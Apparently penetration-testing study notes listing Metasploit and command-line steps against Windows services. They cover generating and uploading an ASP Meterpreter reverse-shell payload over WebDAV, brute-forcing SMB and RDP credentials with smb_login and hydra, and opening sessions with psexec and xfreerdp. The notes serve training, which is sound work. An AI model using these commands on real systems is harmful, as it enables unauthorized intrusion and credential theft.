
### Webdav with metasploit

- `nmap -sV -p 80 --script=http-enum <target>`
- Generate paylaod `msfvenom - p windows/meterpreter/reverse_tcp LHOST=<host_ip> LPORT=<host_port> -f asp > shell.asp`
- `cadaver <target/webdav>` -> put payload into website
- Set up listener -> open `msfconsole`
- `use multi/handler`  -> `set payload windows/meterpreter/reverse_tcp` -> set lhost and lport -> run

Other exploit method
- Use module exploit `iis_webdav_upload_asp` -> set `HttpUsername` and `HttpPassowrd`
- set `PATH`

### SMB with Psexec

SMB (Samba in linux) protocol utilizes two levels of authentication
- User Authentication - Username + password
- Share authentication - Password share

![SMB auth](./Assets/image_9.png)

PsExec is lightweight telnet develop by MS. PsExec authentication is performed via SMB (usually using user Administrator)

Common exploit is brute force SMB.

- Use module `smb_login` -> Set `RHOSTS` `SMB domain` (if needed) 
- Set `USER_FILE` () and `PASS_FILE` -> Run to get username and password
- `psexec.py user@ip cmd.exe` to setup remote sessions

Other method:
- Use exploit module `smb/psexec` to setup remote sessions.

### RDP

- Use module `rdp_scanner` Scan for port running RDP
- To obtain user/password, use `hydra`
  - `hydra -L <user_list> -P <password_list> rdp://<target> -s <port>`
  - Reduce brute force speed by `-t <number>` default `16`
- Use `xfreerdp /u:<user> /p:<pass> /v:<target_ip>:<port>`